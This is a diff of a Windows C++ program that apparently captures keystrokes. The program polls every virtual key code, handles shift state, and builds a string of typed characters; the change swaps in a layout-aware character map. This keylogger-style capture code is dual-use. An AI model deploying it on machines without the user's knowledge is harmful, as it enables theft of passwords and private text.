@@ -4,12 +4,15 @@
 #include <wchar.h>
 #include <winuser.h>
 #include <windef.h>
+#include <map>
 
 #define shiftcode1 0x10
 #define shiftcode2 0xA0
 #define IsPressed 0x8000
 #define entercode 0x0D
 #define backspace 0x08
+
+#define cur_thread 0
 
 using namespace std;
 
@@ -19,7 +22,17 @@ bool DoesValGiveChar(int KeyCode) {
 
 int main() {
 
-    const int min_len = 21;
+    //This seems inefficient. But if it works, it works
+    HKL layout = GetKeyboardLayout(cur_thread);
+
+    char Characters[90] = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz1234567890!@#$%¨&*(){}[]~;:/?|'-_=+";
+    map<SHORT, char> ValToCharMap;
+
+    for (int ind = 0; ind < 90; ind++) {
+        SHORT input_val = VkKeyScanExA(Characters[ind], layout);
+        ValToCharMap.insert({input_val, Characters[ind]});
+    }
+
     string Word = "";
     int ind = 0;
 
@@ -32,6 +45,9 @@ int main() {
 
         //"An idiot admires complexity, a genius admires simplicity"
         //-Terry Davis
+
+        BYTE KBstate[256]; GetKeyboardState(KBstate);
+
         for (int KeyCode = 0; KeyCode < 256; KeyCode++) {
 
             if (KeyCode==shiftcode1 || KeyCode==shiftcode2) {continue;}
@@ -57,13 +73,13 @@ int main() {
                         if (DoesValGiveChar(KeyCode)) {
 
                             if (!PressedKeys[KeyCode]) {
-                                char SelectedChar = MapVirtualKey(KeyCode, MAPVK_VK_TO_CHAR);
-                                char PressedKey = (MakeUppercase) ? SelectedChar : tolower(SelectedChar);
+
+                                wchar_t PressedKey = (MakeUppercase) 
+                                ? ValToCharMap[(SHORT)KeyCode | 0x100] : ValToCharMap[(SHORT)KeyCode];
+
 
                                 PressedKeys[KeyCode] = true;
-                                if ((bool)SelectedChar) {
-                                    Word.push_back(PressedKey);
-                                }
+                                Word.push_back(PressedKey);
                                 ind++;
                             }
                         }
